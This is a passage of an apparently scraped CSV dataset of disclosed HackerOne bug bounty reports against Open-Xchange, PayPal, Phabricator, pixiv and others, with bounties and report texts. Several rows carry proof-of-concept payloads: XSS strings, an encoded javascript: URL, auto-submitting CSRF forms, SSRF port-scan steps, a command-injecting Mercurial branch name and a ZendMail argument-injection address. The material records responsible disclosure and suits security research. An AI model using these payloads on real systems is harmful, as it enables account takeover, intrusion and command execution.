3) request.py will also run from the attacker server and connect to the target host (192.168.0.16), this will POST test.vcard to the vulnerable endpoint multiples times, 20 by default.  Make sure the test.vcard file is in the script working directory or it won't be uploaded.
4) The App Suite server will then carry out a DNS lookup to the photo URL which can be found in the vcard file
http://testserver65.com:70/test.jpeg  
In this case I added the following in /etc/hosts: <Wi-Fi gateway IP address> testserver65.com on the App Suite server.
The reason I’ve added a public IP address is that the Java file will block a private address during the initial POST.   So I used the gateway address on my home router to port-forward port 70 to port 70 on the attacker system (192.168.0.6).  I was using port 80 for something else in this case, hence the port change.
5) The attacker webserver will send a 301 response back after each request with the following URL: http://127.0.0.1:<port number>.  The port number will rotate on every GET request.
6) The HTTP response time will then be logged to the script_output.txt file when a port connection attempt is made.  Sorted in descending order of response time.
Results
-Below are the results from the script_out.txt file.  As you can see, the listening ports on the App-Suite server have the longest response times.  (Port 2, 6, 8, 10)
Code 140 BytesWrap lines Copy Download12: [2.562081]
26: [2.557924]
310: [2.557095]
48: [2.556498]
51: [0.104492]
63: [0.044996]
79: [0.041817]
84: [0.037032]
97: [0.036648]
105: [0.036015]
-Below is an extract of the responses from the Netcat listeners on the App Suite server:
Code 370 BytesWrap lines Copy Download1GET / HTTP/1.1
2Cache-Control: no-cache
3Pragma: no-cache
4User-Agent: Java/1.8.0_151
5Host: 127.0.0.1:2
6Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
7Connection: keep-alive
8
9GET / HTTP/1.1
10Cache-Control: no-cache
11Pragma: no-cache
12User-Agent: Java/1.8.0_151
13Host: 127.0.0.1:6
14Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
15Connection: keep-alive
The following HTTP re-direct codes were attempted, results below:
Code 201 BytesWrap lines Copy Download1300 - multiple choices, failed
2301 - moved permanently, working
3302 - found, working
4303 - see other, working
5305 - use proxy, working
6307 - temporary redirect, failed
7308 - permanent redirect, failed
8
Impact
Again, as with the previous report, this vulnerability can mainly be used for blind port scanning and IP discovery on the target host and any internal networks the target host has access to.  There was no ability to extract files or access other data.
All the best.6 attachments:F245094: test.vcardF245095: attacker_server.pyF245096: PhotoMapping.javaF245098: request.pyF245099: script_output.txtF245109: poc_setup.pngmheiland Open-Xchange staff  changed the status to Triaged. Dec 11th (5 years ago)Thanks for the report, we're going to look in to this as we made recent changes to a central HTTP handling library as a response to #293847.logan5   posted a comment. Dec 12th (5 years ago)No problem, let me know if you need any more info from me.
All the best.mheiland Open-Xchange staff  closed the report and changed the status to Resolved. Dec 14th (5 years ago)We solved this vulnerability internally and will provide a backport to in-production releases during the next weeks.Open-Xchange  rewarded logan5 with a $850 bounty. Dec 14th (5 years ago)logan5   posted a comment. Dec 14th (5 years ago)Thanks for the quick triage and bounty award!  I have one and possibly two additional SSRF vulnerabilities that I have discovered, would you prefer that I re-test them after you backport fixes in the coming weeks or submit them just now?
All the best.mheiland Open-Xchange staff  posted a comment. Dec 14th (5 years ago)We've an internal build ready every couple of minutes and can validate your reports against it if you're fine with that approach. Doing this for two more reports should not be a problem for us.logan5   posted a comment. Dec 14th (5 years ago)Sure, no problem for me.  I'll write them up and send them on in the next couple of days.
Cheers.mheiland Open-Xchange staff  updated the severity to medium. May 24th (3 years ago)mheiland Open-Xchange staff  requested to disclose this report. Jul 4th (3 years ago)logan5   agreed to disclose this report. Jul 5th (3 years ago)  This report has been disclosed. Jul 5th (3 years ago)",https://hackerone.com/reports/296045,Bavaria,Germany,Nuremberg,2017,12,7,21,3
Panther Labs,101-250,0.0,10m-50m,$250.00,Medium,5.45,None,Broken Link Hijacking on Twitter link,run_win  submitted a report to Panther Labs.Mar 4th (2 years ago),https://hackerone.com/reports/1117079,California,United States,San Francisco,2021,3,4,13,36
Panther Labs,101-250,0.0,10m-50m,$100.00,Medium,5.45,None,Broken subdomain takeover of runpanther which was pointing towards herokuapp,dhakal_bibek  submitted a report to Panther Labs.Oct 25th (about 1 year ago),https://hackerone.com/reports/1379910,California,United States,San Francisco,2021,10,25,4,49
Paragon Initiative Enterprises,101-250,0.0,10m-50m,$50.00,Low,2.0,Cross-site Scripting (XSS) - Stored,Cross-site-Scripting,"test_this  submitted a report to Paragon Initiative Enterprises.May 4th (6 years ago)step:
1: goto https://bridge.cspr.ng/my/account of your account
2. in ""Custom Profile field option"" check the box and enter xss payload in ""display name"" field
payload: ""p<script>alert('xss')</script>""
3. update the information
4. open the account in INTERNET EXPLORER 11 and xss will executed
note: here server is not sanitize the user input properly,
payload will not work in firefox,chrome browser due to ""content-security-policy""
But internet explorer does not Support ""Content-Security-Policy""  so xss will execut
this is stored xss and the display name will visible to everywhere, so its possible to account takeover of ther user3 attachments:F181936: payload.pngF181937: source_code.pngF181938: xss3.png",https://hackerone.com/reports/226203,Massachusetts,United States,Weston,2017,5,4,21,39
Paragon Initiative Enterprises,101-250,0.0,10m-50m,$25.00,No value,0.0,Cross-Site Request Forgery (CSRF),CSRF token does not valided during blog comment,"ranjit_p  submitted a report to Paragon Initiative Enterprises.Oct 3rd (5 years ago)SUMMURY
i tested that all post request has CSRF token.
During Author profile creation also a CSRF token is posted. Now when i removed this CSRF token , show   s error like bellow 
Code 500 BytesWrap lines Copy Download1CSRF validation failed
2
30 /var/www/csprng/src/Cabin/Bridge/Controller/Author.php(52): Airship\Engine\Controller->post(Object(Airship\Cabin\Bridge\Filter\Author\AuthorFilter))
4/var/www/csprng/src/Engine/AutoPilot.php(485): Airship\Cabin\Bridge\Controller\Author->create()
5 /var/www/csprng/src/Engine/AutoPilot.php(315): Airship\Engine\AutoPilot->serve(Array, Array)
6 /var/www/csprng/src/public/index.php(86): Airship\Engine\AutoPilot->route(Object(Airship\Engine\Networking\HTTP\ServerRequest))
7{main}
So its a CSRF validation failed error.
Now if request submitted with proper CSRF token, then response will be 302 redirect.
So, i come to this point that if proper CSRF token provided then we get 302 redirect as success response and If CSRF validation failed then we get above error response or something else.
Now  during Blog Reply comment Following request POST data is made
Code 204 BytesWrap lines Copy Download1
2_CSRF_TOKEN=KrkFX0bGkcwgoIKX8Y7KKr1F%3A0ElYiUhZ5wJDSS8kE2FmPxY58Dr3533SH63ZRJBPBfO-&author=47&name=&email=&url=&message=ssdfsfsfsf+sfsd&g-recaptcha-response=03AJzQf7Ojuy_9znHGgl-bZOSweJZo...............
3
Now remove the CSRF_TOKEN and see  302 redirect as response header, this  indicate that request is successfull and server does not checked CSRF here And no CSRF validation error.
Code 310 BytesWrap lines Copy Download1HTTP/1.1 302 Found
2Date: Tue, 03 Oct 2017 01:15:15 GMT
3Content-Type: text/html; charset=UTF-8
4Connection: close
5Cache-Control: no-store, no-cache, must-revalidate
6Expires: Thu, 19 Nov 1981 08:52:00 GMT
7Location: https://cspr.ng/blog/2017/05/csprng-airship-dev-branch#comments
8Pragma: no-cache
9Status: 302 Found
i checked four file are reponsible for blog comment and non of them are checking CSRF.
https://github.com/paragonie/airship/blob/master/src/Cabin/Bridge/Controller/Blog.php
https://github.com/paragonie/airship/blob/master/src/Cabin/Bridge/Model/Blog.php
https://github.com/paragonie/airship/blob/master/src/Cabin/Hull/Model/Blog.php
https://github.com/paragonie/airship/blob/master/src/Cabin/Hull/Controller/BlogPosts.php#107
here i see only the last file verify google captcha but not CSRF
STEP TO REPRODUCE

goto any  post and comment
capture request and remove CSRF token
submit that request and see successfull, no CSRF validation error",https://hackerone.com/reports/273998,Massachusetts,United States,Weston,2017,10,3,7,32
Paragon Initiative Enterprises,101-250,0.0,10m-50m,$50.00,No value,0.0,Information Exposure Through Directory Listing,"Directory Disclose,Email Disclose Zendmail vulnerability","test_this  submitted a report to Paragon Initiative Enterprises.May 13th (6 years ago) i found three vulnerability
Directory information disclose,Email address disclose, and possible Remote code execution in Zendmail
during signup your code accept username with ',"",/,@ while all of the special character must be forbidden or encoded in username
Directory Disclose:


goto sign-up  page and create a account with  username with double quote like as""
signin and goto ur account and add email address, then logout
3.goto Forgot-Password section and enter username of above ( as"" )
4.and see full path of server has been disclose (screenshot: directory.png)

Email address Disclose

if you look close to screenshot below that email address of the user also disclose
Zendmail rce

from the above screenshot, ur are using zendmail for email verification
and searching through exploit of zendmail ,i found that  Zendmail is vulnerable to Remote code Execution
a security researcher Dawid Golunski discover its flaw CVE-2016-10034 in December
where user can set corrupted email like '""attacker\"" -oQ/tmp/ -X/var/www/cache/phpcode.php ""@email.com'; cause RCE
His link https://legalhackers.com/advisories/ZendFramework-Exploit-ZendMail-Remote-Code-Exec-CVE-2016-10034-Vuln.html
its possible to add such email in user account
i also reported  this flaw of email REGEX  https://hackerone.com/reports/226334 but you ignored
i also tried this payload but cant confirm that file has been created or not because i was testing in your website
you can also confirm by locally
Using the above username ( as"") break the sql query during email sending cause exception throw
also checked that if i used that username in password reset ,server response time is delayed
it may cause Dos attack but it not possible in that case because u using Cloudflare network to prevent1 attachment:F184266: directory.png",https://hackerone.com/reports/228112,Massachusetts,United States,Weston,2017,5,13,9,57
Paragon Initiative Enterprises,101-250,0.0,10m-50m,$50.00,No value,0.0,Open Redirect,Open-redirect on paragonie.com,"hat_mast3r  submitted a report to Paragon Initiative Enterprises.Jan 27th (7 years ago)Hello, 
I would like to report about open-redirect on  paragonie.com
Here is the PoC that redirects to URL. For example::https://paragonie.com//google.com/
Regards,
Hat_Mast3r",https://hackerone.com/reports/113112,Massachusetts,United States,Weston,2016,1,27,21,30
PayPal,10001,0.0,over-1b,"$6,800.00",Medium,5.4,Open Redirect,[PayPal Android] Remote theft of user session using push_notification_webview deeplink,bagipro  submitted a report to PayPal.Oct 15th (4 years ago),https://hackerone.com/reports/424443,California,United States,San Jose,2018,10,15,23,12
PayPal,10001,0.0,over-1b,"$10,000.00",Medium,6.5,Open Redirect,[Venmo Android] Remote theft of user session,bagipro  submitted a report to PayPal.Aug 28th (4 years ago),https://hackerone.com/reports/401940,California,United States,San Jose,2018,8,28,22,15
PayPal,10001,0.0,over-1b,"$20,000.00",High,8.7,HTTP Request Smuggling,Bypass for #488147 enables stored XSS on https://paypal.com/signin again,albinowax  submitted a report to PayPal.Mar 15th (4 years ago)Summary by albinowaxI've posted a full writeup over at https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn,https://hackerone.com/reports/510152,California,United States,San Jose,2019,3,15,12,0
PayPal,10001,0.0,over-1b,"$9,700.00",Medium,6.8,Denial of Service,DoS on PayPal via web cache poisoning,"albinowax  submitted a report to PayPal.Jun 20th (3 years ago)Summary by albinowaxBy the time you read this, there should be a full writeup on this technique at https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning",https://hackerone.com/reports/622122,California,United States,San Jose,2019,6,20,12,4
PayPal,10001,0.0,over-1b,"$10,500.00",High,7.1,Insecure Direct Object Reference (IDOR),IDOR to add secondary users in www.paypal.com/businessmanage/users/api/v1/users,born2hack  submitted a report to PayPal.Sep 26th (4 years ago),https://hackerone.com/reports/415081,California,United States,San Jose,2018,9,26,21,32
PayPal,10001,0.0,over-1b,"$18,900.00",High,8.7,HTTP Request Smuggling,Stored XSS on https://paypal.com/signin via cache poisoning,albinowax  submitted a report to PayPal.Jan 29th (4 years ago)Summary by albinowaxI've posted a full writeup over at https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn,https://hackerone.com/reports/488147,California,United States,San Jose,2019,1,29,16,14
PayPal,10001,0.0,over-1b,"$15,300.00",High,8.0,Missing Authentication for Critical Function,Token leak in security challenge flow allows retrieving victim's PayPal email and plain text password,"alexbirsan  submitted a report to PayPal.Nov 18th (3 years ago)Summary by alexbirsanFull write-up available here: 
https://medium.com/@alex.birsan/the-bug-that-exposed-your-paypal-password-539fc2896da9?sk=aeba33c3c331c3f06d230296a21a41e7",https://hackerone.com/reports/739737,California,United States,San Jose,2019,11,18,14,31
PayPal,10001,0.0,over-1b,"$1,100.00",Medium,4.0,Deserialization of Untrusted Data,Unsafe deserialization leads to token leakage in PayPal & PayPal for Business [Android],bagipro  submitted a report to PayPal.Dec 2nd (4 years ago)Summary by bagiprohttps://blog.oversecured.com/Exploiting-memory-corruption-vulnerabilities-on-Android/,https://hackerone.com/reports/453791,California,United States,San Jose,2018,12,2,10,4
PayPal,10001,0.0,over-1b,"$2,900.00",Medium,4.6,Cross-site Scripting (XSS) - Generic,XSS [flow] - on www.paypal.com/paypalme/my/landing (requires user interaction),"stefanofinding  submitted a report to PayPal.Oct 18th (4 years ago)Steps to reproduce
On Chrome and Firefox:

Go to https://www.paypal.com/paypalme/my/landing?flow=cmV0dXJuVXJsPWphdmFzY3JpcFQ6UEFZUEFMLmNvbSUzZDEsbG9jYXRpb24lM2QnamF2YXNjcmlwdDpceDNjc3ZnXHgyMG9ubG9hZD1hbGVydFx4Mjhkb2N1bWVudC5kb21haW5ceDI5XHgzZScmY2FuY2VsVXJsPWphdmFzY3JpcFQ6UEFZUEFMLmNvbSUzZDEsbG9jYXRpb24lM2QnamF2YXNjcmlwdDpceDNjc3ZnXHgyMG9ubG9hZD1hbGVydFx4Mjhkb2N1bWVudC5kb21haW5ceDI5XHgzZSc=
Click on the X at the top right of the modal window

On Safari:

Go to https://www.paypal.com/paypalme/my/landing?flow=cmV0dXJuVXJsPWphdmFzY3JpcFQ6UEFZUEFMLmNvbSUzZDEsbG9jYXRpb24lM2QnamF2YXNjcmlwdDphbGVydFx4Mjhkb2N1bWVudC5kb21haW5ceDI5JyZjYW5jZWxVcmw9amF2YXNjcmlwVDpQQVlQQUwuY29tJTNkMSxsb2NhdGlvbiUzZCdqYXZhc2NyaXB0OmFsZXJ0XHgyOGRvY3VtZW50LmRvbWFpblx4Mjkn
Click on the X at the top right of the modal window

Explanation
The value of the paramter flow is a base64 value which decoded looks like this:
Code 45 BytesWrap lines Copy Download1returnUrl={paypal_url}&cancelUrl={paypal_url}
cancelUrl is passed as the href value of the X button at the top right of the modal window that appears. It doesn't matter if you already created a paypal.me address.
returnUrl is passed as the href value of the Done button when you follow the instructions to create a paypal.me profile.
The problem is that javascripT:paypal.com is considered a valid value for returnUrl and cancelUrl. However, there a few restrictions already: you can't add a %0a character (or almost any special character, even using HTML encoding) and the URL has to start with javascripT:*.paypal.com or javascripT:paypal.com or javascripT://paypal.com or javascripT://*.paypal.com.
First thing you have to take care of is about paypal.com because the object paypal doesn't exist, which will stop anything from working. The good thing is that PAYPAL does exist and PAYPAL.com is accepted as a valid value in the URL.
The second thing is that parentheses, quotes, semicolons and new lines are not allowed. But equal signs, commas and single quotes are allowed. So, you can set PAYAPL.com to any valid value you want like PAYPAL.com=1. Then you can use location and set it to something like 'javascript:alert\x28\x29'. I encoded the invalid special characters in a encoding that Javascript understands and will decode before changing the location. Now you can put anything you want.
On Firefox and Chrome, the location='javascript:alert\x28\x29' writes javascript:alert() in the document, so I had to change it to make it work. Ended up with this: location='javascript:\x3csvg\x20onload=alert\x28document.domain\x29\x3e'.
Impact
You could make actions as the authenticated user and probably more but I didn't tried.",https://hackerone.com/reports/425200,California,United States,San Jose,2018,10,18,0,36
Phabricator,1-10,1.0,No value,$300.00,No value,0.0,Cross-Site Request Forgery (CSRF),Log in a user to another account,"dawidczagan  submitted a report to Phabricator.Jan 23rd (9 years ago)It is possible to log in the user to another account (no CSRF token). POC (for demonstration purposes with Submit button; normally sent automatically):
Code 387 BytesWrap lines Copy Download1<html>
2  <body>
3    <form action=""http://DOMAIN-WITH-PHABRICATOR/auth/login/password:self/"" method=""POST"">
4      <input type=""hidden"" name=""&#95;&#95;dialog&#95;&#95;"" value=""1"" />
5      <input type=""hidden"" name=""username"" value=""user3"" />
6      <input type=""hidden"" name=""password"" value=""password3"" />
7      <input type=""submit"" value=""Submit request"" />
8    </form>
9  </body>
10</html>
The user needs to be logged out, when the aforementioned request is submitted. It is assumed that user3 with password3 exists.",https://hackerone.com/reports/774,No value,No value,No value,2014,1,23,12,54
Phabricator,1-10,1.0,No value,$300.00,No value,0.0,Cross-Site Request Forgery (CSRF),Login CSRF using Twitter OAuth,"mathias  submitted a report to Phabricator.Feb 23rd (9 years ago)This bug is related to bug report #774 (Log in a user to another account) by @dawidczagan as this bug also allows a user to be logged in as the attacker. The main reason is that no state is maintained in the authentication flow. Although the Twitter flow still uses OAuth 1.0A, which has no state parameter as in OAuth 2, it is still possible to prevent this type of attack by setting an additional parameter in the oauth_callback value.
An attacker could exploit this bug as follows:

Attacker initiates Twitter OAuth process with Phabricator
Attacker allows access to Phabricator app
Attacker records and drops redirection to Phabricator (in order not to consume token)
Attacker directs victim to /auth/login/twitter:twitter.com/?oauth_token={attacker_token}&oauth_verifier={attacker_verifier}
Victim is now logged in as attacker

To mitigate this vulnerability, either maintain state in the authentication flow by adding a parameter in the callback value or, as Twitter seems to support OAuth 2, use that instead.",https://hackerone.com/reports/2228,No value,No value,No value,2014,2,23,17,25
Phabricator,1-10,1.0,No value,$600.00,No value,0.0,Privilege Escalation,Abusing VCS control on phabricator,tunnelshade  submitted a report to Phabricator.Jun 13th (8 years ago)My reporting skills suck but I tried to make a clear report. Please let me know if you need any further clarifications,https://hackerone.com/reports/16315,No value,No value,No value,2014,6,13,12,49
Phabricator,1-10,1.0,No value,$300.00,No value,0.0,Privilege Escalation,Abusing daemon logs for Privilege escalation under certain scenarios,"tunnelshade  submitted a report to Phabricator.Jun 14th (8 years ago)Setup Needed

A normal user account
A momentary disruption of mail services

Replication steps

Login as normal user
Wait for momentary disruption of mail services
Use Password Reset Link for admin mail address
BOOM!!!
You can see the password reset link in the daemon logs because of interrupted mail service (check the screenshot)
Click on the link and upgrade to Admin

Attack Scenarios
(Virtually unlimited)
A moment misconfiguration of 

Mail configuration
Firewall settings
Mail Service down
etc.. etc.. (we just need a moment :P)

I actually discovered this bug when gmail rejected my smtp credentials to prevent suspicious login :P.1 attachment:F11310: daemon-log.pngepriestley Phabricator staff  posted a comment. Jun 15th (8 years ago)This should be fixed by this change, which censors values from logs:
https://secure.phabricator.com/D9540
However, we probably need to remove logs from the web UI entirely to really fix this. This is unfortunate because they're very useful for debugging and troubleshooting, but we can't realistically ever blacklist all of the sensitive stuff that can end up there.tunnelshade   posted a comment. Updated Jun 16th (8 years ago)Yes, logs leak too much info and it is practically difficult to blacklist everything, so you can either keep log access for just admins or make it an admin granted privilege. Triage?epriestley Phabricator staff  closed the report and changed the status to Resolved. Jun 18th (8 years ago)This has been fixed in HEAD:
https://secure.phabricator.com/rPHUe57d872cbe61686bf215520b0158cdf1f5dce26a
I've filed this to keep track of removing the UI entirely:
https://secure.phabricator.com/T5405The Internet Bug Bounty  rewarded tunnelshade with a $300 bounty. Jun 18th (8 years ago)This attack requires an account, depends on an external service failure, requires an install have username/password authentication configured, indirectly alerts administrators by sending them password reset emails, and is mitigated by two-factor auth if it's in use.epriestley Phabricator staff  requested to disclose this report. Jun 18th (8 years ago)This can be disclosed at any time, the fix is in public version control.tunnelshade   agreed to disclose this report. Jun 18th (8 years ago)Keep it up guys, you rock & phabricator too :)  This report has been disclosed. Jun 18th (8 years ago)",https://hackerone.com/reports/16392,No value,No value,No value,2014,6,14,3,9
Phabricator,1-10,1.0,No value,$300.00,No value,0.0,Improper Authentication - Generic,Broken Authentication and Session Management,"anandprakash_  submitted a report to Phabricator.Jun 24th (8 years ago)Hi,
Hope you are good!
Steps to repro:
1) Create a Phabricator account having email address ""a@x.com"".
2) Now Logout and ask for password reset link. Don't use the password reset link sent to your mail address.
3) Login using the same password back and update your email address to ""b@x.com"" and verify the same. Remove ""a@x.com"".
4) Now logout and use the password reset link which was mailed to ""a@x.com"" in step 2.
5) Password will be changed.
All previous password reset links should automatically expire once a user changes his email address.
Please fix this.
Best Regards
Anand Prakash",https://hackerone.com/reports/17474,No value,No value,No value,2014,6,24,16,46
Phabricator,1-10,1.0,No value,"$1,000.00",No value,0.0,Improper Authentication - Generic,Bypass auth.email-domains,"tomvg  submitted a report to Phabricator.Feb 23rd (9 years ago)Email addresses are stored as VARCHAR(128). However, Phabricator does not verify the length of an email address upon registration. This allows attackers to bypass the allowed email-domains defined in auth.email-domains.
Exploiting this is rather straightforward: get an email address of 128 characters long (This StackOverflow answer indicates that the maximum length of an email address is 254 characters). Now register with your 128 character email address with @allowed-domain.com appended to it. The @allowed-domain.com part will be truncated because MySQL can’t store it, and you will receive a verification email on your 128 character email address.
This is especially easy if you’re using a Gmail address: if you own attacker@gmail.com, you’ll also receive any mails sent to attacker+aaaaaaaaaaa…aaa@gmail.com.",https://hackerone.com/reports/2224,No value,No value,No value,2014,2,23,16,8
Phabricator,1-10,1.0,No value,$500.00,No value,0.0,Improper Authentication - Generic,Bypass auth.email-domains (2),"tomvg  submitted a report to Phabricator.Feb 23rd (9 years ago)This vulnerability has the same effect as my previously reported bug #2224 Bypass auth.email-domains, but uses a very different approach, bypassing the current fix.
Instead of truncating through length, this vulnerability uses truncation via MySQL’s (weird) behaviour on inserting Unicode characters with code points greater than 0xFFFF into columns that have a utf8 charset. MySQL then truncates a string as soon as it reaches such a character. For more info, see How to support full Unicode in MySQL databases by @mathias.
To replicate, register an account with following address: attacker@gmail.com𝌆@allowed-domain.com.
I would suggest to reconsider not verifying email addresses as was mentioned here.",https://hackerone.com/reports/2233,No value,No value,No value,2014,2,23,18,44
Phabricator,1-10,1.0,No value,"$1,000.00",Critical,9.9,Command Injection - Generic,Command injection on Phabricator instance with an evil hg branch name,"pnig0s  submitted a report to Phabricator.Nov 9th (5 years ago)Hi phabricator,
I found an evil branch name of hg a repo can lead to arbitrary command injection on phabricator instance.
Here is the reproduction steps:

Monitor a remote mercurial repo with phabricator;
Create a branch and called ""--config=hooks.pre-log=wget"" on the remote;
After phabricator update the remote repo,visit the history page of that crafted branch;

Code 77 BytesWrap lines Copy Download1http://instanceip/source/hgclone/history/--config%253Dhooks.pre-log%253Dwget/

It will raise an error like below and the wget command will be executed;
I test this issue both on my own server instance and the cloud instance with mercurial 4.4(latest) installed(on my server).

Code 598 BytesWrap lines Copy Download1Command failed with error #255! COMMAND hg --config ui.ssh='/data/phabricator/phabricator/bin/ssh-
2connect' log --debug --template '{node};{parents}\n' --limit 101 -b '--config=hooks.pre-log=wget' --rev 
3'reverse(ancestors('\''84e8c5feb4faba2f1b230575e747c3bffe7c7a3c'\''))' STDOUT running hook pre-log: 
4wget STDERR not trusting file /var/repo/3/.hg/hgrc from untrusted user root, group root not trusting file 
5/var/repo/3/.hg/hgrc from untrusted user root, group root wget: missing URL Usage: wget [OPTION]... 
6[URL]... Try `wget --help' for more options. abort: pre-log hook exited with status 1
The root cause is that the branch name inject to the hg command directly and that define a hook will run before the hg log command been executed.
Thanks!2 attachments:F237921: evil_hg_branch_name_command_injection.pngF237923: evil_hg_branch_name_command_injection_cloud.png",https://hackerone.com/reports/288704,No value,No value,No value,2017,11,9,8,57
Phabricator,1-10,1.0,No value,$600.00,Medium,4.8,Information Disclosure,"Differential ""Show Raw File"" feature exposes generated files to unauthorised users","calvium  submitted a report to Phabricator.Mar 16th (6 years ago)Summary:
In certain circumstances, a user or mongoose can see a file from a diff they should not be able to see due to a policy.
Preface:
We are an app agency using a private Phabricator instance to manage projects. This issue prevents us from allowing clients to access our instance as they would have the ability to see some confidential content for other clients. Spaces and policies seem to work fine other than this issue.
Video:
Attached is a <8 min video where I show the issue on a fresh Phabricator installation. The first 6 mins is preparation. The issue is visible in the last 30 seconds.
You will see I look up ID of the generated file in the database to speed up the demonstration. We could scan through pages automatically with a script to make this bug more viable.
Reproduction steps:

Open two different browsers (to simulate two different users)
BROWSER 1: Log in as a user
BROWSER B: Log in as another user
BROWSER 1: Go to differential and create a new diff. Make it visible to just yourself
BROWSER 1: Update the diff a few times (I've seen the bug more reproducible when the diff is long and the update weaves in changes throughout the file, though this may not actually be a factor)
BROWSER B: Visit the diff page, see it is restricted and you cannot see it.
BROWSER 1: On the diff page, click ""View Options"" > ""Show Raw File (Right)"". This generates a File.
BROWSER B: Start guessing file number pages (this could be done automatically).
BROWSER B: Eventually you will hit the file number of the new file and can see the private diff from BROWSER 1.

Expected result:

The file generated by Phabricator while comparing diffs should not be accessible. It is not inheriting any policy.

Actual result:

BROWSER B can download the content of the file, seeing a private diff.

Conclusion:
We have over 80,000 files in our Phabricator instance from 10s of projects from various clients. If we share our instance with a client that is either malicious or naive in keeping their credentials secure, we would expose some of our other clients code as a consequence of using the ""Show Raw File"" feature.
Thanks
Matt Votsikas
Calvium Ltd1 attachment:F169337: show-raw-file.mp4",https://hackerone.com/reports/213942,No value,No value,No value,2017,3,16,15,41
Ping Identity,1001-5000,0.0,50m-100m,$100.00,Low,2.0,Improper Access Control - Generic,"Forbidden access to https://apps-staging.pingone.com but ""/packages.json"" visible and full path disclosure",mjigar821  submitted a report to Ping Identity.Jan 9th (3 years ago),https://hackerone.com/reports/770711,Colorado,United States,Denver,2020,1,9,8,0
Ping Identity,1001-5000,0.0,50m-100m,$150.00,Medium,4.9,Information Exposure Through Sent Data,Google Maps API key leaked during device pairing,bug_digger21  submitted a report to Ping Identity.Oct 28th (3 years ago),https://hackerone.com/reports/724039,Colorado,United States,Denver,2019,10,28,15,41
Ping Identity,1001-5000,0.0,50m-100m,$150.00,Low,2.0,Information Disclosure,Internal Hostname disclosure from multiple Apache servers via blank host header method,jackb898  submitted a report to Ping Identity.Apr 24th (4 years ago),https://hackerone.com/reports/548094,Colorado,United States,Denver,2019,4,24,23,5
Ping Identity,1001-5000,0.0,50m-100m,$100.00,Low,2.0,Insufficient Session Expiration,Session misconfiguration on forget password feature at https://ort-admin.pingone.com,gujjuboy10x00  submitted a report to Ping Identity.Jul 25th (3 years ago),https://hackerone.com/reports/659957,Colorado,United States,Denver,2019,7,25,20,20
Ping Identity,1001-5000,0.0,50m-100m,$300.00,Medium,5.7,Cross-site Scripting (XSS) - Stored,Stored XSS in Application menu via Home Page Url,renniepak  submitted a report to Ping Identity.Feb 16th (3 years ago)renniepak   posted a comment. Feb 16th (3 years ago)renniepak   posted a comment. Feb 16th (3 years ago)h1_analyst_gordon HackerOne triage  posted a comment. Feb 17th (3 years ago)h1_analyst_gordon HackerOne triage  posted a comment. Feb 17th (3 years ago)renniepak   posted a comment. Feb 19th (3 years ago)h1_analyst_gordon HackerOne triage  updated the severity from high to medium (5.7). Feb 22nd (3 years ago)h1_analyst_gordon HackerOne triage  changed the status to Triaged. Feb 22nd (3 years ago)Ping Identity  rewarded renniepak with a $300 bounty. Feb 28th (3 years ago)renniepak   posted a comment. May 23rd (2 years ago)volcanic82 Ping Identity staff  closed the report and changed the status to Resolved. Aug 28th (2 years ago)renniepak   requested to disclose this report. Aug 29th (2 years ago)volcanic82 Ping Identity staff  agreed to disclose this report. Nov 16th (2 years ago)  This report has been disclosed. Nov 16th (2 years ago),https://hackerone.com/reports/797754,Colorado,United States,Denver,2020,2,16,19,48
Ping Identity,1001-5000,0.0,50m-100m,$100.00,Low,2.7,Violation of Secure Design Principles,Session misconfiguration on change password feature at https://apps-staging.pingone.com/myaccount/?environmentId=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx#,gujjuboy10x00  submitted a report to Ping Identity.Jul 15th (3 years ago),https://hackerone.com/reports/643731,Colorado,United States,Denver,2019,7,15,16,6
pixiv,51-100,0.0,10m-50m,$500.00,Medium,5.45,Cross-Site Request Forgery (CSRF),CSRF at https://chatstory.pixiv.net/imported,"katsuragicsl  submitted a report to pixiv.Apr 11th (4 years ago)Summary:
A CSRF in https://chatstory.pixiv.net/imported can trick users to import a novel of the attacker as the users' chatstory.
Steps To Reproduce:

Attacker creates a novel
Go to the novel (https://www.pixiv.net/novel/show.php?id=10997105) Import the novel as chatstory by clicking the ""チャットストーリーを作る"" on the sidebar. You show notice that the actual request to create a chatstory is a POST request to https://chatstory.pixiv.net/imported with body

id=<novel_id>&text=<something>&comment=<something>&title=<something>&user_id=<attacker_id>&x_restrict=0&is_original=true

Use the above information to create a http post form. The <attacker_id> doesn't matter. 

Supporting Material/References:
Please see the following ""living"" PoC:
`<html>
Code 988 BytesWrap lines Copy Download1  <body>
2  <script>history.pushState('', '', '/')</script>
3    <form action=""https://chatstory.pixiv.net/imported"" method=""POST"">
4      <input type=""hidden"" name=""id"" value=""10997105"" />
5      <input type=""hidden"" name=""text"" value=""test&lt;script&gt;alert&#40;1&#41;&lt;&#47;script&gt;&#13;&#10;&#13;&#10;&#13;&#10;Title&#13;&#10;&#13;&#10;Normal&#13;&#10;&#13;&#10;Jump&#13;&#10;&#13;&#10;&#13;&#10;"" />
6      <input type=""hidden"" name=""comment"" value=""test&amp;lt&#59;script&amp;gt&#59;alert&#40;1&#41;&amp;lt&#59;&#47;script&amp;gt&#59;"" />
7      <input type=""hidden"" name=""tags"" value=""&#35;test"" />
8      <input type=""hidden"" name=""title"" value=""test&lt;script&gt;alert&#40;1&#41;&lt;&#47;script&gt;"" />
9      <input type=""hidden"" name=""user&#95;id"" value=""39570048"" />
10      <input type=""hidden"" name=""x&#95;restrict"" value=""0"" />
11      <input type=""hidden"" name=""is&#95;original"" value=""true"" />
12      <input type=""submit"" value=""Submit request"" />
13    </form>
14  </body>
15</html>
16`
Impact
Trick users to import novel of attacker as a chatstory",https://hackerone.com/reports/534908,Tokyo,Japan,Tokyo,2019,4,11,4,33
pixiv,51-100,0.0,10m-50m,$500.00,Medium,5.45,Cross-site Scripting (XSS) - Reflected,XSS reflected on [https://www.pixiv.net],"bcobain23  submitted a report to pixiv.Dec 31st (3 years ago)Summary:
I found a xss reflected on https://www.pixiv.com URL and in the search bottom from Chrome IOS 13.1
Steps To Reproduce:

In the URL https://www.pixiv.net/en/%5B'-alert(document.cookie)-'%5D Add Payload ['-confirm(3)-']
In the URL https://www.pixiv.net/en/%5B'-alert(document.cookie)-'%5D Add ['-alert(document.cookie)-']
